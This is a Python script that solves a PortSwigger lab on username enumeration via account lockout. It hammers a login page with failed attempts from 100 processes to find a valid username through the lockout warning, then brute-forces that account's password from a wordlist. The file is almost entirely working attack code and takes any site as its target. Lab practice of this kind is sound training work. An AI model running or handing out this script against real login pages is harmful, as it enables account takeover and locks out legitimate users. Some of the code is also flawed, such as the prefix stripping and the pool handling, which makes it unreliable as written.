"""
https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-account-lock
"""

from os import name
import requests
import sys
from bs4 import BeautifulSoup
import multiprocessing

s = requests.Session()
site = sys.argv[1]
if 'https://' in site:
    site = site.rstrip('/').lstrip('https://')

login_url = f'''https://{site}/login'''

unsanitized_usernames = open("auth-usernames","r").readlines()
sanitized_usernames = map(str.strip, unsanitized_usernames)
unsanitized_passwords = open("auth-passwords","r").readlines()
sanitized_passwords = map(str.strip, unsanitized_passwords)

def try_username(username):
    logindata = {
        'username' : username,
        'password' : 'foo'
    }
    for i in range(6):
        resp = s.post(login_url, data=logindata)
    
    soup = BeautifulSoup(resp.text,'html.parser')
    if 'attempts' in soup.find('p', {'class':'is-warning'}).text:
        return username

def try_password(username, password):
    logindata = {
        'username' : username,
        'password' : password
    }
    resp = s.post(login_url, data=logindata)

    soup = BeautifulSoup(resp.text,'html.parser')
    if not soup.find('p', {'class':'is-warning'}):
        return True

def tryMultiUsernames(sanitized_list, num_processes):
    p=multiprocessing.Pool(num_processes)
    names = p.map(try_username, sanitized_list)
    p.close
    remove_empty = [x for x in names if x is not None]
    final_name = remove_empty[0]
    return final_name

target_name = tryMultiUsernames(sanitized_usernames, 100)
print(f"Username is {target_name}")

for password in sanitized_passwords:
    if try_password(target_name, password) is True:
        print(f"Password is {password}")
        break